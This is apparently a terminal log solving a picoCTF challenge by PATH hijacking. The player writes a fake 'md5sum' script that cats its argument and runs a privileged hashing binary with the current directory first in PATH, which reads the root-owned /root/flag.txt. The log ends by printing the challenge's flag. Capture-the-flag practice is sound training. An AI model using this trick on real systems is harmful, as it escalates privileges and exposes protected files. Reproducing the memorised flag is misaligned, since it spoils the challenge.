# ctf-player@pico-chall$ ls
# flaghasher
# ctf-player@pico-chall$ ./flaghasher 
# Computing the MD5 hash of /root/flag.txt.... 

# 4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt

###############speciallll 
# ctf-player@pico-chall$ echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
# ctf-player@pico-chall$ chmod +x md5sum
# ctf-player@pico-chall$ PATH=.:$PATH ./flaghasher
# Computing the MD5 hash of /root/flag.txt.... 

# picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678}4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt